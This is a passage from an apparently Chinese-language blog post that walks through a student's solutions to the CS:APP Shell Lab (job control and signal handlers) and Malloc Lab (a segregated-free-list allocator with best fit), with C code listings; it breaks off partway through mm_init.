class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;jobs&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h3><p>先获取对应作业，再根据输入的命令是<code>fg</code>或<code>bg</code>切换作业到前(后)台运行，发送<code>SIGCONT</code>信号使它重启。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *op=argv[<span class="hljs-number">0</span>],*id=argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span>* <span class="hljs-title">job</span>;</span><br>    <span class="hljs-keyword">if</span>(id==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong argument\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//get job by jid/pid</span><br>    <span class="hljs-keyword">if</span>(id[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;%&#x27;</span>)&#123;<br>        <span class="hljs-keyword">if</span>( (job=getjobjid(jobs,atoi(id+<span class="hljs-number">1</span>))) ==<span class="hljs-literal">NULL</span> )&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: No such job\n&quot;</span>,id);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(atoi(id)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>( (job=getjobpid(jobs,atoi(id))) ==<span class="hljs-literal">NULL</span> )&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: No such process\n&quot;</span>,atoi(id));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong argument\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// switch job state</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(op,<span class="hljs-string">&quot;fg&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        job-&gt;state=FG;<br>        kill(-job-&gt;pid,SIGCONT);<br>        waitfg(-job-&gt;pid);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(op,<span class="hljs-string">&quot;bg&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        job-&gt;state=BG;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>        kill(-job-&gt;pid,SIGCONT);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>前台作业数量至多为1，用<code>sigsuspend</code>保持阻塞，直到前台作业结束。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * waitfg - Block until process pid is no longer the foreground process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>    <span class="hljs-type">sigset_t</span> mask;<br>    sigemptyset(&amp;mask);<br>    <span class="hljs-keyword">while</span>(fgpid(jobs))sigsuspend(&amp;mask);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>循环调用<code>waitpid</code>检测子进程是否终止或停止，以确保回收所有子进程。根据子进程不同状态分别处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> prev_errno=errno;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-type">sigset_t</span> mask, prev;<br>    sigfillset(&amp;mask);<br>    <span class="hljs-keyword">while</span>( (pid=waitpid(<span class="hljs-number">-1</span>,&amp;status,WNOHANG|WUNTRACED)) &gt; <span class="hljs-number">0</span> )&#123;<br>        sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))deletejob(jobs,pid);   <span class="hljs-comment">//exited normally</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(WIFSTOPPED(status))&#123;<br>            <span class="hljs-comment">//stopped by signal</span><br>            job = getjobpid(jobs, pid);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>,job-&gt;jid,pid,WSTOPSIG(status));<br>            job-&gt;state=ST;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(WIFSIGNALED(status))&#123;<br>            <span class="hljs-comment">//terminated by signal</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>,pid2jid(pid),pid,WTERMSIG(status));<br>            deletejob(jobs,pid);        <br>        &#125;<br>        sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    errno=prev_errno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="sigint-handler-sigtstp-handler"><a href="#sigint-handler-sigtstp-handler" class="headerlink" title="sigint_handler, sigtstp_handler"></a>sigint_handler, sigtstp_handler</h3><p>处理逻辑相似：获取前台进程的PID，用<code>kill</code>函数对进程组的所有进程发送相应信号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>	<span class="hljs-type">int</span> prev_errno=errno;<br>    <span class="hljs-type">pid_t</span> pid=fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)kill(-pid,SIGINT);<br>    errno=prev_errno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> prev_errno=errno;<br>    <span class="hljs-type">pid_t</span> pid=fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)kill(-pid,SIGTSTP);<br>    errno=prev_errno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="7-Malloc-Lab-欢迎来到SIGSEGV的世界"><a href="#7-Malloc-Lab-欢迎来到SIGSEGV的世界" class="headerlink" title="7. Malloc Lab: 欢迎来到SIGSEGV的世界"></a>7. Malloc Lab: 欢迎来到SIGSEGV的世界</h2><p>写了十二个小时头秃了，空闲块管理使用分离空闲链表，分配方式使用最佳适配，至于更细粒度的优化还是先放一边吧。</p>
<h3 id="宏和全局变量定义"><a href="#宏和全局变量定义" class="headerlink" title="宏和全局变量定义"></a>宏和全局变量定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Constants &amp; Basic macros*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WSIZE      4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DSIZE      8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE  160</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLASS_SIZE 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX(a, b) ((a) &gt; (b) ? (a) : (b))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN(a, b) ((a) &lt; (b) ? (a) : (b))</span><br><span class="hljs-comment">/* Pack a size and allocated bit into a word */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACK(size, allocated) ((size) | (allocated))</span><br><span class="hljs-comment">/* Read and write a word at address p */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p)          (*(unsigned int *)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT(p, val)     (*(unsigned int *)(p) = (val))</span><br><span class="hljs-comment">/* Get size and allocated field at address p */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SIZE(p)     (GET(p) &amp; ~0x7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_ALLOC(p)    (GET(p) &amp; 1)</span><br><span class="hljs-comment">/* Given block pointer bp, compute address of its header and footer*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HEADER(bp)      ((char*)(bp) - WSIZE) </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FOOTER(bp)      ((char*)(bp) + GET_SIZE(HEADER(bp)) - DSIZE)</span><br><span class="hljs-comment">/* Given block pointer bp, compute address of next and previous blocks */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEXT_BLOCK(bp)  ((char*)(bp) + GET_SIZE(HEADER(bp)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_BLOCK(bp)  ((char*)(bp) - GET_SIZE((char*)(bp) - DSIZE))</span><br><span class="hljs-comment">/* Get the address of the pointer to predecessor/successor FREE block */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRED(bp)        ((char*)(bp) + WSIZE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCC(bp)        ((char*)(bp))</span><br><span class="hljs-comment">/* Get the address of predecessor/successor FREE block*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRED_BLOCK(bp)  GET(PRED(bp))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCC_BLOCK(bp)  GET(SUCC(bp))</span><br><span class="hljs-comment">/* Heap Pointer */</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* heap_listp;<br><span class="hljs-comment">/* Freelist Pointer */</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* seg_listsp;<br></code></pre></td></tr></table></figure>

<h3 id="空闲链表添加-删除"><a href="#空闲链表添加-删除" class="headerlink" title="空闲链表添加&#x2F;删除"></a>空闲链表添加&#x2F;删除</h3><p>添加时计算大小所属分类，删除时修改相应指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Add a free block to/Delete the free block from the explicit free list</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">addFreeBlock</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> asize = GET_SIZE(HEADER(bp));<br>    <span class="hljs-type">int</span> index = size_class(asize);<br>    <span class="hljs-type">void</span>* listp = seg_listsp + index * WSIZE;<br>    <span class="hljs-type">void</span>* first_block = SUCC_BLOCK(listp);<br>    <span class="hljs-comment">//bp &lt;--&gt; first_block</span><br>    PUT(SUCC(bp), first_block);<br>    <span class="hljs-keyword">if</span> (first_block ) PUT(PRED(first_block), bp);    <br>    <span class="hljs-comment">//listp &lt;--&gt; bp</span><br>    PUT(SUCC(listp), bp);<br>    PUT(PRED(bp), listp);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">delFreeBlock</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">void</span> *pred_block = PRED_BLOCK(bp);<br>    <span class="hljs-type">void</span> *succ_block = SUCC_BLOCK(bp);<br>    PUT(SUCC(pred_block), succ_block);<br>    <span class="hljs-keyword">if</span> (succ_block) PUT(PRED(succ_block), pred_block);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="扩展堆"><a href="#扩展堆" class="headerlink" title="扩展堆"></a>扩展堆</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Extend the heap</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">extendHeap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> words)</span><br>&#123;<br>    words = words % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? words : words + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">size_t</span> size = words * WSIZE;<br>    <span class="hljs-type">void</span> *new_bp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((new_bp = mem_sbrk(size)) == ((<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    PUT(HEADER(new_bp), PACK(size, <span class="hljs-number">0</span>));            <span class="hljs-comment">//overwrite epilogue header</span><br>    PUT(FOOTER(new_bp), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(PRED(new_bp), <span class="hljs-literal">NULL</span>);<br>    PUT(SUCC(new_bp), <span class="hljs-literal">NULL</span>);<br>    PUT(HEADER(NEXT_BLOCK(new_bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));   <span class="hljs-comment">//restore epilogue header</span><br>    <span class="hljs-comment">/* Coalesce if previous block was free */</span><br>    new_bp = coalesce(new_bp);<br>    addFreeBlock(new_bp);<br>    <span class="hljs-keyword">return</span> new_bp;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="合并空闲块"><a href="#合并空闲块" class="headerlink" title="合并空闲块"></a>合并空闲块</h3><p>根据前后块的分配情况分别讨论。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * coalesce - Coalesce adjacent free blocks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span> <br>&#123;<br>    <span class="hljs-type">void</span> *prev_p = PREV_BLOCK(bp);<br>    <span class="hljs-type">void</span> *next_p = NEXT_BLOCK(bp);<br>    <span class="hljs-type">int</span> prev_alloc = GET_ALLOC(HEADER(prev_p));<br>    <span class="hljs-type">int</span> next_alloc = GET_ALLOC(HEADER(next_p));<br>    <span class="hljs-type">size_t</span> combined_size = GET_SIZE(HEADER(bp));<br>    <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; next_alloc) <span class="hljs-keyword">return</span> bp;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;<br>        delFreeBlock(prev_p);<br>        combined_size += GET_SIZE(HEADER(prev_p));<br>        PUT(HEADER(prev_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(bp), PACK(combined_size, <span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> prev_p;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;<br>        delFreeBlock(next_p);<br>        combined_size += GET_SIZE(HEADER(next_p));<br>        PUT(HEADER(bp), PACK(combined_size, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(next_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        delFreeBlock(prev_p);<br>        delFreeBlock(next_p);<br>        combined_size += GET_SIZE(HEADER(prev_p)) + GET_SIZE(HEADER(next_p));<br>        PUT(HEADER(prev_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(next_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> prev_p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>用segregated fit划定起始类别，每次寻找做best fit。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * find a free block (best fit)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">find_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">void</span> *listp, *bp, *best = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> curr_size,min_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> index = size_class(asize);<br>    <span class="hljs-keyword">while</span> (index &lt;= CLASS_SIZE) &#123;<br>        listp = seg_listsp + index * WSIZE;<br>        bp = SUCC_BLOCK(listp);<br>        <span class="hljs-keyword">while</span> (bp) &#123;<br>            curr_size = GET_SIZE(HEADER(bp));<br>            <span class="hljs-keyword">if</span> (curr_size &gt;= asize &amp;&amp; (min_size == <span class="hljs-number">0</span> || curr_size &lt; min_size)) &#123;<br>                min_size = curr_size;<br>                best = bp;<br>            &#125;<br>            bp = SUCC_BLOCK(bp);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (best) <span class="hljs-keyword">break</span>;<br>        index+=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> best;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Get corresponding size class</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_class</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-class"><span class="hljs-keyword">class</span> =</span> <span class="hljs-number">0</span>;<br>    size &gt;&gt;= <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">while</span> (size &amp;&amp; (class&lt;CLASS_SIZE) ) &#123;<br>        size &gt;&gt;= <span class="hljs-number">1</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">class</span> +=</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> class;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="分割空闲块"><a href="#分割空闲块" class="headerlink" title="分割空闲块"></a>分割空闲块</h3><p>如果剩余空间除去分配空间以外不小于一个块的最小大小，分割出一个空闲块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** </span><br><span class="hljs-comment"> * split&amp;allocate</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">use_block</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span> <br>&#123;<br>    <span class="hljs-type">size_t</span> blksize = GET_SIZE(HEADER(bp));<br>    delFreeBlock(bp);<br>    <span class="hljs-keyword">if</span> (blksize - asize &gt; <span class="hljs-number">2</span> * DSIZE) &#123;<br>        PUT(HEADER(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(FOOTER(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(HEADER(NEXT_BLOCK(bp)), PACK(blksize - asize, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(NEXT_BLOCK(bp)), PACK(blksize - asize, <span class="hljs-number">0</span>));<br>        addFreeBlock(NEXT_BLOCK(bp));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        PUT(HEADER(bp), PACK(blksize, <span class="hljs-number">1</span>));<br>        PUT(FOOTER(bp), PACK(blksize, <span class="hljs-number">1</span>));<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>

<h3 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h3><p>先分配各个大小类别的空闲链表，然后分配序言块、结束块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>((heap_listp = mem_sbrk((<span class="hljs-number">4</span>+CLASS_SIZE)*WSIZE)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CLASS_SIZE; i+=<span class="hljs-number">1</span>) PUT(heap_listp + i*WSIZE, <span class="hljs-literal">NULL</span>);<br>    PUT(heap_listp + CLASS_SIZE * WSIZE, <span class="hljs-number">0</span>);                     <span class="hljs-comment">//alignment</span><br>    